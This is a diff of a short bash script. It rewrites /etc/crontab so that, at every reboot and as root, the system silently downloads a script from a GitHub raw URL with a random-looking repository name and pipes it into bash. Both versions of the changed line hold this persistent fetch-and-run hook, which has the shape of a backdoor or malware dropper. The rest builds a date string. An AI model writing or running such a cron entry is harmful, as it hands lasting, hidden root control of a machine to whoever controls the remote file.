@@ -1,7 +1,7 @@
 #!/bin/bash
 
 src="https://raw.githubusercontent.com/vjbahkds/cajbdfv/main"
-sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
+sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$name" ] || name="NULL"
